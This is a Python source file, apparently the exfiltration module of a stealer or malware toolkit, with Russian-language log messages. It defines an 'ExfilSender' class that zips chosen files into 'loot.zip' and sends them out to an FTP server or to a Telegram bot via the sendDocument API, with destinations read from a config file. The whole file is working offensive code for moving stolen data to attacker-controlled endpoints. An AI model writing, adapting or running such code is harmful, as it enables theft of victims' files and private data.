import os
import zipfile
import ftplib
import json
from utils.logger import log

class ExfilSender:
    def __init__(self, config_file="exfil_config.json"):
        self.config = {}
        try:
            with open(config_file) as f:
                self.config = json.load(f)
        except:
            pass

    def archive_files(self, files, archive_name="loot.zip"):
        with zipfile.ZipFile(archive_name, 'w') as zf:
            for f in files:
                if os.path.isfile(f):
                    zf.write(f)
        log(f"[ExfilSender] Архив создан: {archive_name}")
        return archive_name

    def ftp_upload(self, filepath):
        cfg = self.config.get('ftp', {})
        host = cfg.get('host')
        user = cfg.get('user')
        passwd = cfg.get('pass')
        if not host:
            log("[ExfilSender] FTP не настроен")
            return False
        with ftplib.FTP(host) as ftp:
            ftp.login(user, passwd)
            with open(filepath, 'rb') as f:
                ftp.storbinary(f'STOR {os.path.basename(filepath)}', f)
        log(f"[ExfilSender] Файл отправлен на FTP {host}")
        return True

    def telegram_upload(self, filepath):
        cfg = self.config.get('telegram', {})
        token = cfg.get('token')
        chat_id = cfg.get('chat_id')
        if not token or not chat_id:
            log("[ExfilSender] Telegram не настроен")
            return False
        import requests
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        with open(filepath, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id}
            requests.post(url, files=files, data=data)
        log("[ExfilSender] Файл отправлен в Telegram")
        return True
